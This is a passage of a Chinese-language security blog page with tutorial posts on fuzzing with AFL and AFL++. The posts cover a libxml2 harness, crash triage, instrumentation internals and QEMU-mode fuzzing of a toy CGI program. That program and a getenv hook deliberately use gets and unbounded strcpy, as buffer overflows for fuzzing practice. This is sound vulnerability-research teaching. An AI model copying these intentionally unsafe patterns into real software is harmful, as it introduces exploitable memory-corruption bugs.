xmlCleanupParser();</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * this is to debug memory for regression tests</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    xmlMemoryDump();</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么我们可以根据上面的案例写出一个 harness，这个在挑战的 ANSWERS.md 中有：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libxml/parser.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;libxml/tree.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    xmlInitParser();</span><br><span class="line">    <span class="keyword">while</span> (__AFL_LOOP(<span class="number">1000</span>)) &#123;</span><br><span class="line">        xmlDocPtr doc = xmlReadFile(argv[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (doc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            xmlFreeDoc(doc);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    xmlCleanupParser();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编写完 harness.c 后插桩编译，-I 选项是指定包含的头文件目录，然后接上 libxml2 的静态链接库，-lz 是使用 zlib 库，-lm 是使用 math 库，然后编译出来的是一个将 libxml2 静态链接的可执行文件，这样在编译插桩的时候就可以直接对 libxml2 的汇编代码进行插桩（如果之前已经对 libxml2 进行了插桩编译，应该就不需要再静态编译了）。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AFL_USE_ASAN=1 afl-clang-fast ./harness.c -I libxml2/include libxml2/.libs/libxml2.a -lz -lm -o fuzzer</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0413-101002978.png" alt="undifined"></p>
<p>编写完 harness 后，就需要使用高质量的种子来启动 afl-fuzz，afl 的源码中提供了一个不错的 XML 字典，可以就使用它来作为初始种子。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir input</span><br><span class="line">echo &quot;&lt;hi&gt;&lt;/hi&gt;&quot; &gt; inout/hi.xml</span><br></pre></td></tr></table></figure>

<p>然后开始 fuzz，-x 是设定 fuzzer 的字典，@@ 类似于占位符，表示输入的位置，因为 harness 使用的是 argv 作为输入。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i in -o out -x ~/Code/AFL/dictionaries/xml.dict ./fuzzer @@</span><br></pre></td></tr></table></figure>

<p>然后让 AFL 在后台运行吧，等待结果，用虚拟机跑了一天，挖出来 16 个 crashes</p>
<p><img src="/images/image-2023-0413-101017775.png" alt="undifined"></p>
<h2 id="处理-crashes"><a href="#处理-crashes" class="headerlink" title="处理 crashes"></a>处理 crashes</h2><p>我们写出来的 harness 是通过命令参数读取文件，那么直接将 output&#x2F;crashes 中的文件给程序，就会报错。而且因为编译的时候使用了  ASAN 标志，会有详细的报错信息提醒。跑出来的 16 个 unique creashes 都是相同的报错：</p>
<p><img src="/images/image-2023-0413-101035360.png" alt="undifined"></p>
<p>通过上图中的函数堆栈回溯，我们可以定位错误的性质是一个字节的堆溢出，而且漏洞是发生在 libxml2&#x2F;parse.c 文件中。个人对堆了解得不是很深入，就在这个地方吧，埋一个坑，以后有空更新。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254167">[安全客] AFL-Training学习记录</a> </li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7400">[先知] 使用AFL挖掘libxml2</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/13/[afl-training]%20quickstart/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="ToT">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/13/%5Bafl-training%5D%20quickstart/" class="post-title-link" itemprop="url">[afl-training] quickstart</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-13 10:05:10 / Modified: 10:26:52" itemprop="dateCreated datePublished" datetime="2023-04-13T10:05:10+08:00">2023-04-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/AFL/" itemprop="url" rel="index"><span itemprop="name">AFL</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="afl-training-quickstart"><a href="#afl-training-quickstart" class="headerlink" title="[afl-training] quickstart"></a>[afl-training] quickstart</h1><p>afl-trainning 是之前在安全客上发现的关于 AFL 实战的学习资料，之前一直想通过 AFL 来进行实战，苦于网上的都是一些基础的使用教程，发现这个资料的时候欣喜万分。</p>
<p>在这个 AFL workshop 中，主要包含了以下的一些内容：</p>
<ul>
<li>quickstart：一个简单的例子，通过 afl 编译程序然后使用 afl-fuzz 来 fuzz，新手入门必看，也就是这一篇文章</li>
<li>harness：</li>
<li>challenges：几个使用 fuzz 可以挖掘出来的经典漏洞<ul>
<li>libxml2：CVE-2015-8317</li>
<li>heartbleed：openssl 的心脏滴血漏洞 CVE-2014-0160</li>
<li>sendmail：CVE-1999-0206, CVE-2003-0161</li>
<li>ntpq：CVE-2009-0159</li>
<li>date：CVE-2017-7476</li>
<li>cyber-grand-challenge</li>
<li>sendmail&#x2F;1305</li>
</ul>
</li>
</ul>
<p>教程是可以使用 docker 的形式创建学习环境的，我这个地方就没有使用了，直接在 git 目录中进行学习。</p>
<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>trainning 中使用的是 AFLplusplus，我此处使用的就是 AFL，因为之前在看 AFL 的源码。</p>
<p>首先进入 quickstart 目录，然后使用 afl-clang 对程序源码进行编译</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd quickstart</span><br><span class="line">CC=afl-clang AFL_HARDEN=1 make</span><br></pre></td></tr></table></figure>

<p>编译出来的程序是读取 STDIN 标准输入进行处理，可直接运行程序，如果敲下回车不输入数据会显示程序帮助信息，也可以直接从 inputs 提供的种子文件进行运行。</p>
<p><img src="/images/image-2023-0413-100605033.png" alt="undifined"></p>
<h2 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h2><p>使用如下的命令直接进行 fuzz，下图是 fuzz 出来的结果，运行了 44 分钟之后跑出了 9 个 crash</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i inputs -o out ./vulnerable</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0413-100622630.png" alt="undifined"></p>
<h2 id="问题总结"><a href="#问题总结" class="headerlink" title="问题总结"></a>问题总结</h2><ul>
<li><p>AFL 是如何使用 afl-clang 进行插桩的？</p>
<p>首先需要知道正常使用 gcc 进行编译和使用 alf-clang 进行编译，产生的可执行文件在二进制上的差别。安全相关，因此先使用 checksec 查看 afl-clang 编译出来的可执行文件开启了哪些防御措施，然后使用 gcc 开启对应的防御参数重新进行编译</p>
</li>
</ul>
<p><img src="/images/image-2023-0413-100640530.png" alt="undifined"></p>
<p>  那么使用 gcc 进行编译的命令如下，FORTIFY 选项没有编译出来</p>
  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -no-pie -fstack-protector-all -z noexecstack -O2 -D_FORTIFY_SOURCE=1 -o vulnerable_gcc vulnerable.c</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-2023-0413-100655331.png" alt="undifined"></p>
<p>  然后使用 bindiff 工具进行查看，可以看到 afl-clang 编译出来的可执行文件中，在每一个基本块中，都加入了 afl_maybe_log 函数，通过在 AFL 源码目录中搜索该函数，可以定位到是在 afl-as.h 文件中，在源码中是以一串静态字符串形式存储的汇编代码，此处以 64 位为例，源码部分如下。</p>
<p><img src="/images/image-2023-0413-100709554.png" alt="undifined"></p>
  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> u8* trampoline_fmt_64 =</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;.align 4\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rdx,  0(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rcx,  8(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq %%rax, 16(%%rsp)\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq $0x%08x, %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;call __afl_maybe_log\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq 16(%%rsp), %%rax\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  8(%%rsp), %%rcx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;movq  0(%%rsp), %%rdx\n&quot;</span></span><br><span class="line">  <span class="string">&quot;leaq (128+24)(%%rsp), %%rsp\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span></span><br><span class="line">  <span class="string">&quot;/* --- END --- */\n&quot;</span></span><br><span class="line">  <span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>  将源代码编译成二进制文件的基本流程是：源代码 -&gt; 汇编代码 -&gt; 二进制代码，将汇编代码编译成二进制的工具就是汇编器 assembler。Linux 常用的汇编器是 as，当完成了 AFL 的编译后，在目录下也会存在一个 as 文件，并且作为符号链接指向 afl-as。因此，此处的代码插桩实现应该是使用的 afl-as，在将源代码编译成汇编代码的过程中，将如上的 afl_maybe_log 函数插入到分支处，也就是在基本块中进行插桩。如上的插桩代码就是 x64 下正常调用一个函数的流程：开辟栈空间，调用 afl_maybe_log 函数，执行完毕函数之后恢复栈平衡。afl_maybe_log 函数也就是插桩具体要执行的内容。此处不多分析 afl_maybe_log 函数的源码，函数位于 afl-as.c 中，就简单说一下函数的实现功能：通过共享内存对基本块的执行情况进行保存。</p>
<p>  对于插桩分析得比较不错的可以参考看雪的这篇文章：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-265973.htm">[原创]AFL编译插桩部分源码分析</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/13/%E4%BD%BF%E7%94%A8afl%E5%AF%B9%E6%97%A0%E6%BA%90%E7%A0%81%E7%A8%8B%E5%BA%8F%E8%BF%9B%E8%A1%8C%E6%B5%8B%E8%AF%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="ToT">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/13/%E4%BD%BF%E7%94%A8afl%E5%AF%B9%E6%97%A0%E6%BA%90%E7%A0%81%E7%A8%8B%E5%BA%8F%E8%BF%9B%E8%A1%8C%E6%B5%8B%E8%AF%95/" class="post-title-link" itemprop="url">使用afl对无源码程序进行测试</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-13 10:01:10 / Modified: 10:03:06" itemprop="dateCreated datePublished" datetime="2023-04-13T10:01:10+08:00">2023-04-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/AFL/" itemprop="url" rel="index"><span itemprop="name">AFL</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="使用-afl-对无源码的程序进行-fuzz"><a href="#使用-afl-对无源码的程序进行-fuzz" class="headerlink" title="使用 afl 对无源码的程序进行 fuzz"></a>使用 afl 对无源码的程序进行 fuzz</h1><p>有源码的情况下，可以使用 afl 相关的编译器进行编译插桩，然后进行 fuzz；如果是无源码的情况下，就需要使用 afl 的 qemu mode 进行 fuzz。这个地方我使用的是 <a target="_blank" rel="noopener" href="https://github.com/AFLplusplus/AFLplusplus">AFLPlusPlus</a>，之前已经大概看过 afl 的源码，afl++ 源码的结构更加清晰，因此后面都是在使用 afl++ 作为 fuzz 工具。</p>
<h2 id="待-fuzz-程序和函数劫持-so"><a href="#待-fuzz-程序和函数劫持-so" class="headerlink" title="待 fuzz 程序和函数劫持 so"></a>待 fuzz 程序和函数劫持 so</h2><p>手上有的程序是 x64 的一个简易 cgi，源码如下，是从环境变量中读取数据存放在 buffer 中，当前的目标就是对其中的一个环境变量进行模糊测试，使用 hook 对 REQUEST_METHOD 赋予给定值 GET，然后对 QUERY_STRING 环境变量从标准输入中读取。具体的 hook 实现过程可以参考<a target="_blank" rel="noopener" href="https://genteeldevil.github.io/2021/12/29/%E5%A6%82%E4%BD%95%E5%8A%AB%E6%8C%81%E4%B8%80%E4%B8%AAcgi%E7%9A%84getenv%E5%87%BD%E6%95%B0/">如何劫持一个 cgi 的 getenv 函数</a>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// cgi_nolen.c</span></span><br><span class="line"><span class="comment">// gcc cgi_nolen.c -o cgi_nolen</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">    <span class="type">char</span>* method = getenv(<span class="string">&quot;REQUEST_METHOD&quot;</span>);</span><br><span class="line">    <span class="type">char</span>* url;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">256</span>];</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">    <span class="keyword">if</span> (!method) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[!] no init env!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 两条路径：</span></span><br><span class="line">    <span class="comment">// GET-&gt;URL 两个环境变量导致的缓冲区溢出</span></span><br><span class="line">    <span class="comment">// POST-&gt;STDIN 一个环境变量+标准输入导致的缓冲区溢出</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(method, <span class="string">&quot;GET&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] this is get method\n&quot;</span>);</span><br><span class="line">        url = getenv(<span class="string">&quot;QUERY_STRING&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] get query string %s\n&quot;</span>, url);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] copy url to buffer\n&quot;</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(buffer, url);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] buffer is %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(method, <span class="string">&quot;POST&quot;</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] this is post method\n&quot;</span>);</span><br><span class="line">        <span class="comment">// 这个地方存在缓冲区溢出</span></span><br><span class="line">        gets(buffer);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] get stdin: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>hook 代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hook.c</span></span><br><span class="line"><span class="comment">// gcc -D_GUN_SOURCE -shared -fPIC -o hook_getenv.so hook.c -ldl</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE  <span class="comment">// 使用RELD_NEXT</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *(*original_getenv_func)(<span class="type">const</span> <span class="type">char</span> *) = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// 定义全局变量buffer来存储STDIN中读取的数据</span></span><br><span class="line"><span class="type">char</span> buffer[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">getenv</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name)</span> &#123;</span><br><span class="line">  <span class="built_in">memset</span>(buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">  <span class="comment">// 这个地方还需要考虑变异出来的数据的长度和大小</span></span><br><span class="line">  <span class="keyword">if</span> (!original_getenv_func) original_getenv_func = dlsym(RTLD_NEXT, <span class="string">&quot;getenv&quot;</span>);</span><br><span class="line">  <span class="comment">// 这个地方需要定义一个缓冲区才行，用来从stdin中读取数据</span></span><br><span class="line">  <span class="type">char</span> *result = original_getenv_func(name);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[hook] hook env %s, origin = %s\n&quot;</span>, name, result);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(name, <span class="string">&quot;REQUEST_METHOD&quot;</span>, <span class="number">14</span>)) &#123;</span><br><span class="line">    <span class="built_in">strncpy</span>(buffer, <span class="string">&quot;GET\0&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;GET\0&quot;</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[hook] changing to %s\n&quot;</span>, buffer);</span><br><span class="line">    <span class="keyword">return</span> buffer;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strncmp</span>(name, <span class="string">&quot;QUERY_STRING&quot;</span>, <span class="number">12</span>)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[hook] hook env URL,change to STDIN\n&quot;</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[hook] from STDIN %s\n&quot;</span>, buffer);</span><br><span class="line">    <span class="keyword">return</span> buffer;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="编译-qemu-mode"><a href="#编译-qemu-mode" class="headerlink" title="编译 qemu-mode"></a>编译 qemu-mode</h2><p>要使用 qemu-mode，首先要编译和待 fuzz 程序架构一致的 afl-qemu-trace。打开 qemu-mode 文件夹，准备编译。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CPU_TARGET=x86_64 ./build_qemu_support.sh</span><br><span class="line">cd ..</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>

<p>如果要 fuzz 其他架构的程序，那么对应把 CPU_TARGET 进行设定即可，例如 arm、i386 等等。</p>
<h2 id="设置-QEMU-的-so-劫持"><a href="#设置-QEMU-的-so-劫持" class="headerlink" title="设置 QEMU 的 so 劫持"></a>设置 QEMU 的 so 劫持</h2><p>正常情况下如果要劫持一个程序的某些函数，使用环境变量 LD_PRELOAD 即可。afl 的 qemu mode 本质上也是使用的 qemu，如果要劫持待 fuzz 程序的函数，需要在启动 afl 的时候使用环境变量 QEMU_SET_ENV 设置程序在 QEMU 运行下的环境变量。那么 fuzz 的启动命令如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QEMU_SET_ENV=LD_PRELOAD=&quot;./hook_getenv.so&quot; REQUEST_METHOD=GET afl-fuzz -i input -o output -m none -Q ./cgi_nolen </span><br></pre></td></tr></table></figure>

<p>可以对上面的启动命令做解释：</p>
<ul>
<li><code>QEMU_SET_ENV=LD_PRELOAD=&quot;./hook_getenv.so&quot;</code> 设置待 fuuz 程序的环境变量，设置劫持</li>
<li><code>REQUEST_METHOD=GET</code> 相当于是将 afl-fuzz 和待 fuzz 程序的 REQUEST_METHOD 值都设置成了 POST，因为在 fuzz 的时候使用 fork 创建的子进程继承了 afl-fuzz 的环境变量。</li>
<li><code>afl-fuzz -i input -o output -m none -Q ./cgi_nolen</code> 从 input 文件夹读取种子，fuzz 结果存放在 output 文件夹，无内存限制，使用 QEMU 模式。</li>
</ul>
<p>跑了 11 分钟，出来了 5000 多个 crash，其中的两个是 unique crash。</p>
<p><img src="/images/image-2023-0413-100152606.png" alt="undifined"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/13/afl%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="ToT">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/13/afl%E5%91%BD%E4%BB%A4%E5%8F%82%E6%95%B0%E8%AF%B4%E6%98%8E/" class="post-title-link" itemprop="url">afl命令参数说明</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-13 09:56:47 / Modified: 09:58:12" itemprop="dateCreated datePublished" datetime="2023-04-13T09:56:47+08:00">2023-04-13</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/AFL/" itemprop="url" rel="index"><span itemprop="name">AFL</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="AFL-命令参数说明"><a href="#AFL-命令参数说明" class="headerlink" title="AFL 命令参数说明"></a>AFL 命令参数说明</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 